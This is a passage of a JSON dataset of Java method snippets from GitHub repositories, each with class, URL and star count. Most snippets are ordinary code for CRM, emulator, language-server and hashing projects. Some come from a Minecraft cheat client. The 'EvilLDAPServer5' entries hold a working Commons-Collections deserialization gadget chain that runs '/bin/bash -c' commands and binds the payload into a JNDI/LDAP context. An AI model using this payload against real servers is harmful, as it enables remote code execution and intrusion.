customer.toLog(con, oldCustomer));\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57266, "method_name": "onBoundingBox", "class_name": "Jesus", "params": ["CollisionBoxEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBoundingBox(CollisionBoxEvent event) {\n        if (mc.player == null)\n            return;\n        if (((event.getBlock() instanceof BlockLiquid)) && event.getEntity() == mc.player\n                && !EntityUtil.isInLiquid() && (mc.player.fallDistance < 3.0F) && (!mc.player.isSneaking())) {\n            event.setAABB(Block.FULL_BLOCK_AABB);\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 57267, "method_name": "onJump", "class_name": "Jesus", "params": ["JumpEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onJump(JumpEvent event) {\n        if (EntityUtil.isColliding(0, -0.8, 0) instanceof BlockLiquid && !EntityUtil.isInLiquid())\n            MotionUtil.setSpeed(mc.player, MotionUtil.getBaseMoveSpeed() - 0.24);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 57268, "method_name": "onUpdate", "class_name": "Jesus", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {\n        if (mc.gameSettings.keyBindSneak.isKeyDown())\n            return;\n        if (EntityUtil.isInLiquid()) {\n            if (event.getTiming().equals(EventTiming.PRE))\n                mc.player.motionY = 0.1;\n        }\n        if (mode.equalsIgnoreCase(\"solid\") && event.getTiming().equals(EventTiming.PRE)) {\n            if (EntityUtil.isColliding(0, -0.1, 0) instanceof BlockLiquid && !EntityUtil.isInLiquid()) {\n                event.getLocation().setY(mc.player.posY + (mc.player.ticksExisted % 2 == 0 ? 0.01 : -0.01));\n                event.getLocation().setOnGround(mc.player.ticksExisted % 2 != 0);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/movement/Jesus.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 57269, "method_name": "getBase", "class_name": "ARMSvcMemory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getBase() {\n        return baseAddr;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57270, "method_name": "getSize", "class_name": "ARMSvcMemory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSize() {\n        return size;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57271, "method_name": "findRegion", "class_name": "ARMSvcMemory", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "MemRegion", "snippet": "    public MemRegion findRegion(long addr) {\n        for (MemRegion region : memRegions) {\n            if (addr >= region.begin && addr < region.end) {\n                return region;\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57272, "method_name": "allocate", "class_name": "ARMSvcMemory", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer allocate(int size, final String label) {\n        size = ARM.alignSize(size);\n        UnicornPointer pointer = base.share(0, size);\n        base = (UnicornPointer) base.share(size);\n        if (log.isDebugEnabled()) {\n            log.debug(\"allocate size=\" + size + \", label=\" + label + \", base=\" + base);\n        }\n        memRegions.add(new MemRegion(pointer.peer, pointer.peer + size, UnicornConst.UC_PROT_READ | UnicornConst.UC_PROT_EXEC, null, 0) {\n            @Override\n            public String getName() {\n                return label;\n            }\n        });\n        return pointer;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57273, "method_name": "getSvc", "class_name": "ARMSvcMemory", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Svc", "snippet": "    public Svc getSvc(int svcNumber) {\n        return svcMap.get(svcNumber);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57274, "method_name": "registerSvc", "class_name": "ARMSvcMemory", "params": ["Svc"], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer registerSvc(Svc svc) {\n        final int number;\n        if (svc instanceof ThumbSvc) {\n            if (emulator.is64Bit()) {\n                throw new IllegalStateException(\"is 64 bit mode\");\n            }\n\n            if (++thumbSvcNumber == SyscallHandler.DARWIN_SWI_SYSCALL) {\n                thumbSvcNumber++;\n            }\n            number = thumbSvcNumber;\n        } else if (svc instanceof ArmSvc || svc instanceof Arm64Svc) {\n            if (svc instanceof ArmSvc && emulator.is64Bit()) {\n                throw new IllegalStateException(\"is 64 bit mode\");\n            }\n            if (svc instanceof Arm64Svc && !emulator.is64Bit()) {\n                throw new IllegalStateException(\"is 32 bit mode\");\n            }\n\n            if (++armSvcNumber == SyscallHandler.DARWIN_SWI_SYSCALL) {\n                armSvcNumber++;\n            }\n            number = armSvcNumber;\n        } else {\n            throw new IllegalStateException(\"svc=\" + svc);\n        }\n        if (svcMap.put(number, svc) != null) {\n            throw new IllegalStateException();\n        }\n        return svc.onRegister(this, number);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57275, "method_name": "writeStackString", "class_name": "ARMSvcMemory", "params": ["String"], "throws": null, "modifiers": ["final", "public"], "return_type": "UnicornPointer", "snippet": "    public final UnicornPointer writeStackString(String str) {\n        byte[] data = str.getBytes(StandardCharsets.UTF_8);\n        return writeStackBytes(Arrays.copyOf(data, data.length + 1));\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57276, "method_name": "writeStackBytes", "class_name": "ARMSvcMemory", "params": ["byte"], "throws": null, "modifiers": ["final", "public"], "return_type": "UnicornPointer", "snippet": "    public final UnicornPointer writeStackBytes(byte[] data) {\n        UnicornPointer pointer = allocate(data.length, \"writeStackBytes: \" + Hex.encodeHexString(data));\n        assert pointer != null;\n        pointer.write(0, data, 0, data.length);\n        return pointer;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ARMSvcMemory.java", "stars": "16", "class_props": {"extends": null, "implements": ["SvcMemory"], "modifiers": ["public"]}}, {"id": 57277, "method_name": "flagOf", "class_name": "MobSpawnFlag", "params": ["Boolean"], "throws": null, "modifiers": ["protected"], "return_type": "MobSpawnFlag", "snippet": "    @Override protected MobSpawnFlag flagOf(@NotNull final Boolean value) {\n        return value ? MOB_SPAWN_ALLOWED : MOB_SPAWN_FORBIDDEN;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/flags/implementation/MobSpawnFlag.java", "stars": "25", "class_props": {"extends": "BooleanFlag", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57278, "method_name": "generateCode", "class_name": "StmDISPOSE", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\tString result = \"\";\n\t\tresult += super.generateCode();\n\t\tswitch (expr.getType().getTypeCode()) {\n\t\tcase POINTER:\n\t\t\tresult += tab() + \"free(\" + expr.generateCode() + \");\" + NL;\n\t\t\tresult += tab() + expr.generateCode() + \" = 0;\" + NL;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthrow new CodeException(\"dispose\");\n\t\t\n\t\t}\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 57279, "method_name": "checkType", "class_name": "StmDISPOSE", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\n\t\texpr.checkType();\n\t\texpr.getType().assertType(this, TypeCode.POINTER);\n\t\texpr.checkType();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 57280, "method_name": "toString", "class_name": "StmDISPOSE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"dispose \" + expr;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmDISPOSE.java", "stars": "3", "class_props": {"extends": "Stm", "implements": null, "modifiers": ["public"]}}, {"id": 57281, "method_name": "init", "class_name": "ViewModelMarkets", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n\n        executor = Executors.newFixedThreadPool(5);\n\n        feedDataFactory = new MarketsDataFactory();\n\n        PagedList.Config pagedListConfig =\n                (new PagedList.Config.Builder())\n                        .setEnablePlaceholders(false)\n                        .setInitialLoadSizeHint(10)\n                        .setPageSize(10)\n                        .build();\n\n\n        articleLiveData = (new LivePagedListBuilder(feedDataFactory, pagedListConfig))\n                .setFetchExecutor(executor)\n                .build();\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSDSAdminModule/MarketsList/ViewModel/ViewModelMarkets.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 57282, "method_name": "refresh", "class_name": "ViewModelMarkets", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void refresh()\n    {\n\n        feedDataFactory.getSourceLiveData().getValue().invalidate();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSDSAdminModule/MarketsList/ViewModel/ViewModelMarkets.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 57283, "method_name": "getArticleLiveData", "class_name": "ViewModelMarkets", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LiveData<PagedList>", "snippet": "    public LiveData<PagedList<Object>> getArticleLiveData() {\n        return articleLiveData;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSDSAdminModule/MarketsList/ViewModel/ViewModelMarkets.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 57284, "method_name": "getObject", "class_name": "EvilLDAPServer5", "params": ["String"], "throws": ["Exception"], "modifiers": ["static", "private"], "return_type": "Object", "snippet": "    private static Object getObject ( String cmd ) throws Exception\n    {\n        Transformer[]   tarray      = new Transformer[]\n        {\n            new ConstantTransformer( Runtime.class ),\n            new InvokerTransformer\n            (\n                \"getMethod\",\n                new Class[]\n                {\n                    String.class,\n                    Class[].class\n                },\n                new Object[]\n                {\n                    \"getRuntime\",\n                    new Class[0]\n                }\n            ),\n            new InvokerTransformer\n            (\n                \"invoke\",\n                new Class[]\n                {\n                    Object.class,\n                    Object[].class\n                },\n                new Object[]\n                {\n                    null,\n                    new Object[0]\n                }\n            ),\n            new InvokerTransformer\n            (\n                \"exec\",\n                new Class[]\n                {\n                    String[].class\n                },\n                new Object[]\n                {\n                    new String[]\n                    {\n                        \"/bin/bash\",\n                        \"-c\",\n                        cmd\n                    }\n                }\n            )\n        };\n        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );\n        Map             normalMap_0 = new HashMap();\n        Map             normalMap_1 = new HashMap();\n        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );\n        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );\n        lazyMap_0.put( \"scz\", \"same\" );\n        lazyMap_1.put( \"tDz\", \"same\" );\n        Hashtable       ht          = new Hashtable();\n        ht.put( lazyMap_0, \"value_0\" );\n        ht.put( lazyMap_1, \"value_1\" );\n        lazyMap_1.remove( \"scz\" );\n        Field           f           = ChainedTransformer.class.getDeclaredField( \"iTransformers\" );\n        f.setAccessible( true );\n        f.set( tchain, tarray );\n        return( ht );\n    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer5.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57285, "method_name": "main", "class_name": "EvilLDAPServer5", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main ( String[] argv ) throws Exception\n    {\n        String  name    = argv[0];\n        String  cmd     = argv[1];\n        Object  obj     = getObject( cmd );\n        Context ctx     = new InitialContext();\n        ctx.rebind( name, obj );\n        System.in.read();\n    }", "url": "https://raw.githubusercontent.com/shadowsock5/JDNI-Bypass-JDK-By-LDAP/master/test1/EvilLDAPServer5.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57286, "method_name": "completion", "class_name": "FullTextDocumentService", "params": ["CompletionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Either>", "snippet": "  public CompletableFuture<Either<List<CompletionItem>, CompletionList>> completion(CompletionParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57287, "method_name": "resolveCompletionItem", "class_name": "FullTextDocumentService", "params": ["CompletionItem"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<CompletionItem>", "snippet": "  public CompletableFuture<CompletionItem> resolveCompletionItem(CompletionItem unresolved) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57288, "method_name": "hover", "class_name": "FullTextDocumentService", "params": ["HoverParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Hover>", "snippet": "  public CompletableFuture<Hover> hover(HoverParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57289, "method_name": "signatureHelp", "class_name": "FullTextDocumentService", "params": ["SignatureHelpParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<SignatureHelp>", "snippet": "  public CompletableFuture<SignatureHelp> signatureHelp(SignatureHelpParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57290, "method_name": "definition", "class_name": "FullTextDocumentService", "params": ["DefinitionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Either>", "snippet": "  public CompletableFuture<Either<List<? extends Location>,List<? extends LocationLink>>> definition(DefinitionParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57291, "method_name": "references", "class_name": "FullTextDocumentService", "params": ["ReferenceParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends Location>> references(ReferenceParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57292, "method_name": "documentHighlight", "class_name": "FullTextDocumentService", "params": ["DocumentHighlightParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends DocumentHighlight>> documentHighlight(DocumentHighlightParams position) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57293, "method_name": "documentSymbol", "class_name": "FullTextDocumentService", "params": ["DocumentSymbolParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<Either<SymbolInformation, DocumentSymbol>>> documentSymbol(DocumentSymbolParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57294, "method_name": "codeAction", "class_name": "FullTextDocumentService", "params": ["CodeActionParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<Either<Command, CodeAction>>> codeAction(CodeActionParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57295, "method_name": "codeLens", "class_name": "FullTextDocumentService", "params": ["CodeLensParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends CodeLens>> codeLens(CodeLensParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57296, "method_name": "resolveCodeLens", "class_name": "FullTextDocumentService", "params": ["CodeLens"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<CodeLens>", "snippet": "  public CompletableFuture<CodeLens> resolveCodeLens(CodeLens unresolved) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57297, "method_name": "formatting", "class_name": "FullTextDocumentService", "params": ["DocumentFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> formatting(DocumentFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57298, "method_name": "rangeFormatting", "class_name": "FullTextDocumentService", "params": ["DocumentRangeFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> rangeFormatting(DocumentRangeFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57299, "method_name": "onTypeFormatting", "class_name": "FullTextDocumentService", "params": ["DocumentOnTypeFormattingParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<List>", "snippet": "  public CompletableFuture<List<? extends TextEdit>> onTypeFormatting(DocumentOnTypeFormattingParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57300, "method_name": "rename", "class_name": "FullTextDocumentService", "params": ["RenameParams"], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<WorkspaceEdit>", "snippet": "  public CompletableFuture<WorkspaceEdit> rename(RenameParams params) {\n    return null;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57301, "method_name": "didOpen", "class_name": "FullTextDocumentService", "params": ["DidOpenTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didOpen(DidOpenTextDocumentParams params) {\n    documents.put(params.getTextDocument().getUri(), params.getTextDocument());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57302, "method_name": "didChange", "class_name": "FullTextDocumentService", "params": ["DidChangeTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didChange(DidChangeTextDocumentParams params) {\n    String uri = params.getTextDocument().getUri();\n    for (TextDocumentContentChangeEvent changeEvent : params.getContentChanges()) {\n      // Will be full update because we specified that is all we support\n      if (changeEvent.getRange() != null) {\n        throw new UnsupportedOperationException(Tools.i18n(\"rangeShouldBeNull\"));\n      }\n\n      documents.get(uri).setText(changeEvent.getText());\n      documents.get(uri).setVersion(params.getTextDocument().getVersion());\n    }\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57303, "method_name": "didClose", "class_name": "FullTextDocumentService", "params": ["DidCloseTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didClose(DidCloseTextDocumentParams params) {\n    String uri = params.getTextDocument().getUri();\n    documents.remove(uri);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57304, "method_name": "didSave", "class_name": "FullTextDocumentService", "params": ["DidSaveTextDocumentParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void didSave(DidSaveTextDocumentParams params) {\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/FullTextDocumentService.java", "stars": "3", "class_props": {"extends": null, "implements": ["TextDocumentService"], "modifiers": []}}, {"id": 57305, "method_name": "getCustomerId", "class_name": "CustomerChangedEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCustomerId() {\n        return customerId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/customer/CustomerChangedEvent.java", "stars": "12", "class_props": {"extends": "UserEvent", "implements": null, "modifiers": ["public"]}}, {"id": 57306, "method_name": "convertTo", "class_name": "UUIDConverter", "params": ["UUID", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String convertTo(UUID uuid, ConversionInfo conversionInfo) {\n        return uuid.toString();\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/converter/UUIDConverter.java", "stars": "3", "class_props": {"extends": null, "implements": ["Converter"], "modifiers": ["final", "public"]}}, {"id": 57307, "method_name": "convertFrom", "class_name": "UUIDConverter", "params": ["String", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "UUID", "snippet": "    public UUID convertFrom(String s, ConversionInfo conversionInfo) {\n        return UUID.fromString(s);\n    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/converter/UUIDConverter.java", "stars": "3", "class_props": {"extends": null, "implements": ["Converter"], "modifiers": ["final", "public"]}}, {"id": 57308, "method_name": "getName", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return target.getName();\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57309, "method_name": "add", "class_name": "HashRingMetrics", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean add(T node) {\n        loads.putIfAbsent(node, 0);\n        return target.add(node);\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57310, "method_name": "addAll", "class_name": "HashRingMetrics", "params": ["Collection<T>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean addAll(Collection<T> nodes) {\n        nodes.forEach(n -> loads.putIfAbsent(n, 0));\n        return target.addAll(nodes);\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57311, "method_name": "contains", "class_name": "HashRingMetrics", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean contains(T node) {\n        return target.contains(node);\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57312, "method_name": "remove", "class_name": "HashRingMetrics", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean remove(T node) {\n        loads.remove(node);\n        return target.remove(node);\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57313, "method_name": "getNodes", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<T>", "snippet": "    public Set<T> getNodes() {\n        return target.getNodes();\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57314, "method_name": "locate", "class_name": "HashRingMetrics", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Optional<T>", "snippet": "    public Optional<T> locate(String key) {\n        Optional<T> node = target.locate(key);\n        node.ifPresent(n -> {\n            int cnt = loads.getOrDefault(n, 0);\n            loads.put(n, cnt + 1);\n            Set<T> prev = keys.computeIfAbsent(key, k -> new HashSet<>());\n            if (!prev.isEmpty() && !prev.contains(n)) {\n                missHits++;\n            }\n            prev.add(n);\n        });\n        return node;\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57315, "method_name": "locate", "class_name": "HashRingMetrics", "params": ["String", "int"], "throws": 